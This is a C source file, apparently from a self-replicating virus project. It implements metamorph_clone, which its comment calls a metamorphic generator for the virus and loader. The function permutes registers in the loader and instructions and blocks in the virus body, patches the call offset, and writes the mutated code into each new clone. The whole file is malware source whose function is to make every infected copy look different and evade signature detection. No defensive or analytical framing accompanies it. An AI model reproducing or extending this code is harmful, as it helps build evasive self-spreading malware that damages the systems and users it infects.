#include <sys/mman.h>
#include "virus.h"
#include "syscalls.h"
#include "metamorphism.h"
#include "utils.h"
#include "jumps.h"
#include "errors.h"

/*
** metamorph_clone is a metamorphic generator for the virus and loader.
**   It applies register permutations on the clone's loader code
**   And block permutations on the clone's virus code
**
**   Some parts of the loader can't be reg-permutated because of
**   syscall calling conventions.
*/

static bool	init_loader_safe(struct safe_ptr *loader_ref,
			struct safe_ptr clone_ref,
			size_t loader_offset, size_t loader_size)
{
	void	*clone_loader = safe(clone_ref, loader_offset, loader_size);

	if (clone_loader == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_LOADER);

	loader_ref->ptr = clone_loader;
	loader_ref->size = loader_size;

	return true;
}

static bool	init_virus_safe(struct safe_ptr *virus_ref,
			struct safe_ptr clone_ref, size_t loader_offset,
			size_t dist_virus_loader, size_t full_virus_size)
{
	size_t	virus_offset = loader_offset + dist_virus_loader;
	size_t	virus_size = full_virus_size - dist_virus_loader;
	void	*clone_virus = safe(clone_ref, virus_offset, virus_size);

	if (clone_virus == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRUS);

	virus_ref->ptr = clone_virus;
	virus_ref->size = virus_size;

	return true;
}

static bool	init_virus_buffer_safe(struct safe_ptr *virus_buffer_ref,
			size_t loader_offset,
			size_t dist_virus_loader, size_t clone_size)
{
	size_t	virus_offset = loader_offset + dist_virus_loader;
	size_t	available_size = clone_size - virus_offset;
	void	*ptr = sys_mmap(0, available_size, PROT_READ | PROT_WRITE,
			MAP_ANON | MAP_PRIVATE, -1, 0);

	if (ptr < 0) return errors(ERR_SYS, _ERR_S_MMAP_FAILED);

	virus_buffer_ref->ptr = ptr;
	virus_buffer_ref->size = available_size;

	return true;
}

static bool	get_virus_address(void **virus_address,
			struct safe_ptr clone_ref,
			size_t loader_offset, size_t dist_vircall_loader)
{
	size_t	vircall_offset = loader_offset + dist_vircall_loader;

	*virus_address = get_jmp32_destination(clone_ref, vircall_offset);

	if (*virus_address == NULL)
		return errors(ERR_THROW, _ERR_T_GET_CLONE_VIRUS_ADDRESS);

	return true;
}

static inline bool	set_virus_buffer_size(size_t *virus_buffer_size,
				size_t virus_size)
{
	*virus_buffer_size = virus_size;
	return true;
}

static bool	adjust_virus_call(struct safe_ptr clone_ref,
			size_t loader_offset, size_t dist_vircall_loader,
			int32_t virus_address_shift)
{
	size_t	vircall_offset = loader_offset + dist_vircall_loader;
	void	*clone_vircall = safe(clone_ref, vircall_offset, CALL32_INST_SIZE);

	if (clone_vircall == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRCALL);

	int32_t	*clone_vircall_arg = clone_vircall + 1;

	*clone_vircall_arg += virus_address_shift;
	return true;
}

static bool	copy_virus_buffer_to_clone(struct safe_ptr clone_ref,
			size_t loader_offset, size_t dist_virus_loader,
			struct safe_ptr virus_buffer_ref,
			size_t virus_buffer_size)
{
	size_t	virus_offset = loader_offset + dist_virus_loader;
	void	*clone_virus = safe(clone_ref, virus_offset, virus_buffer_size);

	if (clone_virus == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_VIRUS);

	memcpy(clone_virus, virus_buffer_ref.ptr, virus_buffer_size);
	return true;
}

static bool	adjust_full_virus_size(size_t *full_virus_size,
			size_t virus_buffer_size, size_t virus_size)
{
	*full_virus_size += virus_buffer_size - virus_size;
	return true;
}

bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_offset,
			size_t *full_virus_size,
			const struct virus_header *vhdr)
{
	const size_t	loader_size         = vhdr->loader_size;
	const size_t	dist_virus_loader   = vhdr->dist_virus_loader;
	const size_t	dist_vircall_loader = vhdr->dist_vircall_loader;
	const uint64_t	seed                = vhdr->seed;

	struct safe_ptr	loader_ref;                                             // loader reference in clone, init by <init_loader_safe>
	struct safe_ptr	virus_ref;                                              // virus reference in clone, init byt <init_virus_safe>
	struct safe_ptr	virus_buffer_ref;                                       // virus buffer reference, filled by <permutate_blocks>
	size_t		virus_buffer_size;                                      // virus size in virus_buffer_ref, init by <set_virus_buffer_size>
	void		*virus_address;                                         // virus address in clone_ref, init by <get_virus_address>
	int32_t		virus_address_shift = 0;                                // virus address shift in clone_ref, init by <permutate_blocks>

	if (!init_loader_safe(&loader_ref, clone_ref, loader_offset, loader_size)
	|| !init_virus_safe(&virus_ref, clone_ref, loader_offset, dist_virus_loader, *full_virus_size)
	|| !init_virus_buffer_safe(&virus_buffer_ref, loader_offset, dist_virus_loader, clone_ref.size)
	|| !get_virus_address(&virus_address, clone_ref, loader_offset, dist_vircall_loader)
	|| !set_virus_buffer_size(&virus_buffer_size, virus_ref.size)
	|| !permutate_registers(loader_ref, seed)
	|| !permutate_instructions(virus_ref, seed)
	|| !permutate_blocks(virus_ref, virus_buffer_ref, &virus_buffer_size, virus_address, &virus_address_shift, seed)
	|| !adjust_virus_call(clone_ref, loader_offset, dist_vircall_loader, virus_address_shift)
	|| !copy_virus_buffer_to_clone(clone_ref, loader_offset, dist_virus_loader, virus_buffer_ref, virus_buffer_size)
	|| !adjust_full_virus_size(full_virus_size, virus_buffer_size, virus_ref.size)
	|| !true)
	{
		free_accessor(&virus_buffer_ref);
		return errors(ERR_THROW, _ERR_T_METAMORPH_CLONE);
	}
	free_accessor(&virus_buffer_ref);
	return true;
}
